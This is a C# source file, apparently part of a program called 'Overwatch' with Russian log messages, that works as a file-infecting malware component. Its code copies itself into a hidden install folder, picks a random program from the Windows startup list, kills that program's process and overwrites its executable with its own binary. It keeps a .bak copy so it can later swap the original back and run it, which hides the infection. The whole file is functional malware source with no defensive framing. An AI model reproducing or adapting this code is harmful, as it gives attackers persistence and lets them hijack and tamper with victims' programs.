using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Overwatch
{
    class cChangeLabel
    {
        static Random random = new Random();
        static appLog Log = new appLog();
        static string path_mycopy;

        private static List<AutorunProgram> autorunPrograms = new List<AutorunProgram>();
        private static string local_path_checkfile = Path.Combine(Path.GetDirectoryName(appConfing.MyFullPath), appConfing.checkFile);

        public static void Infect(string[] args = null)
        {
            // Check if the application is in the working / target folder
            if (InTargetLocation())
            {
                Log.Write($"Нахожусь в рабочей папке {appConfing.targetFullPath}.", true);
                return;
            }

            if (cRegistry.ExistsInAutorun(appConfing.MyFullPath))
            {
                MoveApp(args);
            }
            else
            {
                if (File.Exists(local_path_checkfile))
                {
                    Thread.Sleep(5000);

                    SwapOriginal(args);
                }
            }

            Log.Write($"Приложение не находиться в {appConfing.targetFullPath}", true);
            Log.Write($"Текущий каталог: {appConfing.MyFullPath}");
            Log.Write("Выполняем установку...");

            CreateDirectory();
            InstallExe();

            InfectAutoRunApps();
        }
        
        private static void InfectAutoRunApps()
        {
            cRegistry.GetAutoruns(autorunPrograms, appConfing.infectFilter);// getting applications at startup

            int programID = random.Next(0, autorunPrograms.Count);
            AutorunProgram targetProgram = autorunPrograms[programID];

            _infect(targetProgram);

            string path_checkfile = Path.Combine(Path.GetDirectoryName(targetProgram.RunFilePath), appConfing.checkFile);
            File.WriteAllText(path_checkfile, DateTime.Now.ToString());

            // место для иконы

            Log.Write($"Приложение {targetProgram.RunFilePath} было заражено.", true);
            Environment.Exit(0);
        }

        private static void MoveApp(string[] args = null)
        {
            Log.Write("Выполняеться MoveApp", true);

            path_mycopy = appConfing.MyFullPath + "_copy.exe";
            File.Copy(appConfing.MyFullPath, path_mycopy, true);
            Process.Start(path_mycopy, string.Join(" ", args));
            Environment.Exit(0);
        }

        private static void SwapOriginal(string[] args = null)
        {
            try
            {
                Log.Write("Выполняеться SwapOriginal", true);

                string[] bak_files = Directory.GetFiles(Path.GetDirectoryName(appConfing.MyFullPath), "*.bak");
                if (bak_files.Length > 0)
                {
                    Log.Write($"Найденный оригинальный файл: {bak_files[0]}");
                    string path_originalApp = Path.Combine(Path.GetDirectoryName(appConfing.MyFullPath), bak_files[0].Replace(".bak", ""));
                    cProcesses.KillFileProcess(path_originalApp, true);
                    File.Copy(bak_files[0], path_originalApp, true);
                    Process.Start(path_originalApp, string.Join(" ", args));
                    File.Delete(local_path_checkfile);
                    File.Delete(bak_files[0]);
                    File.Delete(path_mycopy);
                }
            }
            catch(Exception ex) { Log.Write(ex.Message, true); }
        }

        private static void _infect(AutorunProgram targetProgram)
        {
            File.Copy(targetProgram.RunFilePath, targetProgram.RunFilePath + ".bak", true);

            int count_try = 0;
            retry:
            if (targetProgram.IsActiveProcess)
            {
                cProcesses.KillFileProcess(targetProgram.RunFilePath, true);
                Log.Write($"KILLED {targetProgram.RunFilePath}", true);            // If the process of the selected program is active - kill
            }
            else
            {
                Log.Write($"Приложение не активно {targetProgram.RunFilePath}", true);
            }

            try
            {
                File.Copy(appConfing.MyFullPath, targetProgram.RunFilePath, true);
            }
            catch
            {
                Thread.Sleep(1000);
                count_try++;

                if (count_try >= 5)
                {
                    InfectAutoRunApps();
                }
                else
                {
                    goto retry;
                }
            }
        }

        public static bool InTargetLocation()
        {
            return appConfing.MyFullPath == appConfing.targetFullPath ? true : false;
        }

        private static void CreateDirectory()
        {
            DirectoryInfo di = new DirectoryInfo(appConfing.targetDirPath);

            Log.Write("Создаем папку");

            if (!di.Exists)
            {
                di.Create();

                Log.Write($"Папка {di.FullName} успешно создана.", true);
            }
            else
            {
                Log.Write($"Папка {di.FullName} уже существует.", true);
            }
        }

        private static void InstallExe()
        {
            FileInfo fi = new FileInfo(appConfing.targetFullPath);

            if (fi.Exists)
            {
                Log.Write($"Копия приложения в {fi.FullName} - существует", true);

                if (!cProcesses.IsFileActiveProcess(fi.FullName))
                {
                    Process.Start(fi.FullName);

                    Log.Write($"Копия приложения в {fi.FullName} - была запущена.");
                }
                else
                {
                    Log.Write($"Копия приложения в {fi.FullName} - в запуске не нуждается.");
                }
            }
            else
            {
                File.Copy(appConfing.MyFullPath, fi.FullName, true);
                Process.Start(fi.FullName);

                Log.Write($"Копия приложения в {fi.FullName} - была создана и запущена.", true);
            }
        }
    }
}
